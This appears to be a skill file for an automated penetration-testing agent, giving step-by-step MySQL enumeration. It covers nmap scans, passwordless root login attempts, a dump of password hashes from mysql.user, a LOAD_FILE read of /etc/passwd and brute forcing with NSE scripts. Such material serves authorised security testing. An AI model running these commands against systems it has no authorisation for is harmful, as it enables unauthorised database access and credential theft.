---
name: db-mysql-enum
description: MySQL database enumeration for version, users, privileges, and data discovery
version: 1.0.0
phase: enum
category: database
tags: [database, mysql, sql, port-scan]
tools: [nmap, mysql-client, sqlmap]
difficulty: basic
opsec_level: medium
time_estimate: 60s
severity_if_found: high
related_skills:
  - db-postgresql-enum
  - ldap-enumeration
mitre_attack:
  - T1213
  - T1046
---

## When to Use

Use this skill when port 3306 (MySQL) is open and you want to enumerate
databases, users, and privileges. Tests for anonymous login and weak auth.

## Prerequisites

- nmap (for service detection)
- mysql-client (mysql, mysqladmin)
- sqlmap (optional, for SQL injection)

## Procedure

```bash
# Step 1: Service detection
nmap -sV -p 3306 TARGET --script mysql-info

# Step 2: Anonymous login test
mysql -h TARGET -u root --skip-password 2>/dev/null
mysql -h TARGET -u '' --skip-password 2>/dev/null

# Step 3: Enumerate databases
mysql -h TARGET -u root -e "SHOW DATABASES;" 2>/dev/null
mysql -h TARGET -u root -e "SELECT VERSION(), USER(), CURRENT_USER();" 2>/dev/null

# Step 4: Enumerate users and privileges
mysql -h TARGET -u root -e "SELECT User, Host, authentication_string FROM mysql.user;" 2>/dev/null
mysql -h TARGET -u root -e "SHOW GRANTS FOR CURRENT_USER();" 2>/dev/null

# Step 5: Check for file read access
mysql -h TARGET -u root -e "SELECT LOAD_FILE('/etc/passwd');" 2>/dev/null

# Step 6: nmap NSE scripts for MySQL enum
nmap -sV -p 3306 TARGET --script mysql-brute,mysql-databases,mysql-users,mysql-empty-password
```

## OPSEC Rules

- Do NOT write, drop, or modify any databases, tables, or data
- Do NOT run heavy queries that could impact database performance
- Limit enumeration to metadata (SHOW, SELECT from mysql.* only)
- Log all queries for audit trail

## Verification

- Confirm MySQL version and running port
- Verify anonymous or root login succeeded
- Check if LOAD_FILE is accessible (file read capability)

## Pitfalls

- MySQL may be running on a non-standard port
- Some MySQL versions restrict `mysql.user` access to superusers only
- Anonymous login may be disabled in MySQL 8.0+
- Root login may be restricted to localhost only

## Output Format

```
[MySQL]   Host: TARGET:3306 — version: 8.0.32
[MySQL]   Login: root@% (no password)
[MySQL]   Databases: information_schema, mysql, performance_schema, wordpress
[MySQL]   Users: root@%, wp_user@localhost, admin@%
[PRIV]    FILE privilege: GRANTED — file read via LOAD_FILE possible
[CRITICAL] Unauthenticated MySQL access — full database compromise
```
